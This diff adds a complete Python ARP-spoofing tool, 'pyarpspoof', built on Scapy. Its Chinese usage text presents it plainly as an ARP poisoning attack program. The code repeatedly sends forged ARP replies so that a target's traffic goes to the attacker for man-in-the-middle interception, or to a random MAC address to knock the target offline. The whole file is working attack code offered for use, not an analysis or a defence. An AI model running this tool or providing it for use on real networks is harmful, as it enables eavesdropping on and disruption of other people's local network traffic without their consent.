@@ -1,0 +1,174 @@
+#!/usr/bin/python
+
+import sys,re,random,logging,subprocess,time
+from scapy.all import (Ether,ARP,sendp,sr1)
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+def cheakIPaddr(ip:str):        #判断IP地址格式
+    return True if re.compile(r"^(25[0-5]|2[0-4]\d|1?\d?[1-9])(\.(25[0-5]|2[0-4]\d|1?\d?\d)){2}\.(25[0-5]|2[0-4]\d|1?\d?[1-9])$").search(ip) else False
+def cheakMACaddr(macaddr:str):  #判断MAC地址格式
+    return True if re.compile(r"([0-9A-F]{2}[:-]){5}([0-9A-F]{2})").search(macaddr.upper()) else False
+
+def getMyMACaddress(interface:str):     #获取自己的MAC地址
+    mac_address = subprocess.check_output("ifconfig " + interface + " | grep ether | awk -F ' ' '{print $2}'", stderr=subprocess.PIPE, shell=True).decode('utf-8')
+    ip_address = subprocess.check_output("ifconfig " + interface + " | grep 'inet ' | awk '{print $2}'", stderr=subprocess.PIPE, shell=True).decode('utf-8')
+    return  (ip_address[:-1],mac_address[:-1].upper()) if mac_address and ip_address else None
+
+def ipAddr2macAddr(ip:str):
+    macAddress = ''
+    ret = sr1(ARP(pdst=ip),timeout=2,verbose=False)
+    if ret:
+        if ret.haslayer('ARP') and ret.fields['op'] == 2:
+            macAddress = ret.fields['hwsrc']
+            return macAddress.upper()
+        return False
+
+def fakeMAC():
+    fakeMACstr = ''
+    d = 'ABCDEF0123456789'
+    for i in range(2):
+        fakeMACstr += random.choice(d)
+    for i in range(5):
+        fakeMACstr += ":"
+        for a in range(2): fakeMACstr += random.choice(d)
+    return fakeMACstr
+
+def unpack(args:list):
+    global dsthostname
+    upack = {'to':None,'is':{'ip':None,'mac':None}}
+    jumbCount = 0
+    for itemID,item in enumerate(args):
+        if jumbCount:
+            jumbCount = jumbCount -1
+            continue
+        keyword = ['to','is','help','me','-i']
+        if item in keyword:
+            if item == 'to':
+                try:
+                    value = args[itemID+1]
+                    if cheakIPaddr(value):
+                        if ipAddr2macAddr(value):
+                            upack['to'] = value
+                            jumbCount = 1
+                        else:
+                            print(f"[error] \"{value}\" 无法在局域网找到，使用 \"pyarpspoof help\" 获取帮助")
+                            sys.exit(0)
+                    else:
+                        print(f"[error] \"{value}\" 不是IPv4地址，使用 \"pyarpspoof help\" 获取帮助")
+                        sys.exit(0)
+                except IndexError:
+                    pass
+            elif item == 'is':
+                try:
+                    values = (args[itemID-1],args[itemID+1])
+                    if cheakIPaddr(values[0]):
+                        if ipAddr2macAddr(values[0]): upack['is']['ip'] = values[0]                            
+                        else:
+                            print(f"[error] \"{values[0]}\" 无法在局域网找到，使用 \"pyarpspoof help\" 获取帮助")
+                            sys.exit(0)
+                    else:
+                        print(f"[error] \"{values[0]}\" 不是IPv4地址，使用 \"pyarpspoof help\" 获取帮助")
+                        sys.exit(0)
+                    if cheakIPaddr(values[1]) or cheakMACaddr(values[1]) or values[1] == 'me':
+                        if cheakIPaddr(values[1]):
+                            macaddr = ipAddr2macAddr(values[1])
+                            dsthostname = values[1]
+                            if macaddr: upack['is']['mac'] = macaddr
+                            else:
+                                print(f"[error] \"{values[1]}\" 无法在局域网找到MAC地址，确保该主机是否存活，使用 \"pyarpspoof help\" 获取帮助")
+                                sys.exit(0)
+                        elif values[1] == "me":
+                            dsthostname = "me"
+                            upack['is']['mac'] = getMyMACaddress('eth0')[1]
+                        else:
+                            upack['is']['mac'] = values[1]
+                    else:
+                        print(f"[error] \"{values[1]}\" 不属于MAC地址或关键字、IPv4地址任意类型，使用 \"pyarpspoof help\" 获取帮助")
+                        sys.exit(0)
+
+                except IndexError:
+                    pass
+            elif item == '-t':
+                pass
+            elif item == 'help':
+                usage()
+    return upack
+def sendARPpkg(DestHost:str, IP:str, MAC:str, FAKEMAC:str,count=1):
+    pkg = Ether(
+        src=FAKEMAC,
+        dst=ipAddr2macAddr(DestHost)
+    )/ARP(
+        op=2,
+        hwsrc=MAC,
+        psrc=IP,
+        hwdst=ipAddr2macAddr(DestHost),
+        pdst=DestHost,
+    )
+    time.sleep(1)
+    sendp(pkg, count=count, verbose=0)
+    del pkg
+def banner():
+    print("""
+ ██▓███ ▓██   ██▓ ▄▄▄       ██▀███   ██▓███    ██████  ██▓███   ▒█████   ▒█████    █████▒
+▓██░  ██▒▒██  ██▒▒████▄    ▓██ ▒ ██▒▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ 
+▓██░ ██▓▒ ▒██ ██░▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ 
+▒██▄█▓▒ ▒ ░ ▐██▓░░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ 
+▒██▒ ░  ░ ░ ██▒▓░ ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    
+▒▓▒░ ░  ░  ██▒▒▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    
+░▒ ░     ▓██ ░▒░   ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░     ░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░      
+░░       ▒ ▒ ░░    ░   ▒     ░░   ░ ░░       ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░    
+         ░ ░           ░  ░   ░                    ░               ░ ░      ░ ░          
+         ░ ░                                                                             
+    """)
+
+def usage():
+    print("""
+Usage: pyarpspoof to <1p ipv4 address> <2p ipv4 address> is [<mac address>/<ipv4 address>/me/fakemac]
+
+这是一个ARP投毒(欺骗)攻击程序，它可以使目标的ARP缓存表变成你设定的内容。
+使目标的网络通讯变得不正常，甚至可以作为中间人监听目标与另一个目标的数据包流量。
+<1p ipv4 address>  指投毒目标
+<2p ipv4 address>  指欺骗内容的IP地址
+<mac address>    指欺骗内容的MAC地址
+<ipv4 address>     指第三者的IP地址，会自动转化为MAC地址     
+<me>        指本地主机MAC地址，通常作为中间人攻击，为关键词
+<fakemac>   指随机的虚假MAC地址，通常用于断网攻击，为关键词
+
+了解ARP协议:
+    ARP协议是根据IP地址获取物理地址（MAC地址）的TCP/IP协议。
+    主机在向局域网内广播携带IP地址的ARP请求，然后更新ARP缓存，确保通讯
+了解ARP投毒(欺骗)攻击:
+    攻击者向目标伪造ARP协议包，使得目标取得错误的ARP缓存。
+    可以理解为，攻击者甲欺骗快递公司说“受害者乙的住址为XX:XX:XX:XX:XX:XX”，但是这里的住址其实是错误的，攻击者可以将地址设置为自己的住址，这样攻击者甲就能收到本该属于受害者乙的快递，攻击者可以查看、保存、修改、丢弃受害者乙的包裹
+例如:
+    pyarpspoof to 192.168.1.1 192.168.1.2 is me
+    -> 欺骗192.168.1.1，192.168.1.2的MAC地址是我的MAC地址(欺骗192.168.1.1自己是192.168.1.2)
+    pyarpspoof to 192.168.1.2 192.168.1.1 is me
+    -> 欺骗192.168.1.2，192.168.1.1的MAC地址是我的MAC地址(欺骗192.168.1.2自己是192.168.1.1)
+    pyarpspoof to 192.168.1.1 192.168.1.2 is 0A:48:71:CD:F8:A1
+    -> 欺骗192.168.1.1，192.168.1.2的MAC地址是0A:48:71:CD:F8:A1(欺骗192.168.1.1，192.168.1.1搬到了xx住址)
+    pyarpspoof to 192.168.1.1 192.168.1.2 is fakemac
+    -> 欺骗192.168.1.1，192.168.1.2的MAC地址是随机MAC地址(欺骗192.168.1.1，192.168.1.2搬到了未知地址)
+
+pyarpspoof help   获取帮助
+    """)
+    sys.exit(0)
+banner()
+dsthostname = None
+u_pack = unpack(sys.argv)
+if u_pack['to'] and u_pack['is']['ip'] and u_pack['is']['mac']:
+    try:
+        fkMac = fakeMAC()
+        while True:
+            sendARPpkg(u_pack['to'],IP=u_pack['is']['ip'],MAC=u_pack['is']['mac'],FAKEMAC=fkMac)
+            if dsthostname:print(f"Tell of {u_pack['to']} {u_pack['is']['ip']} is {u_pack['is']['mac']}({dsthostname})")
+            else:print(f"Tell of {u_pack['to']} {u_pack['is']['ip']} is {u_pack['is']['mac']}...")
+    except KeyboardInterrupt:
+        print("Just Kidding...")
+        trueMac = ipAddr2macAddr(u_pack['is']['ip'])
+        print(f"Tell of {u_pack['to']} {u_pack['is']['ip']} is {trueMac}...")
+        sendARPpkg(u_pack['to'],IP=u_pack['is']['ip'],MAC=trueMac,FAKEMAC=fkMac,count=5)
+else:
+    print("[error] 缺少了一些参数，使用 \"pyarpspoof help\" 获取帮助")
+    sys.exit(0)
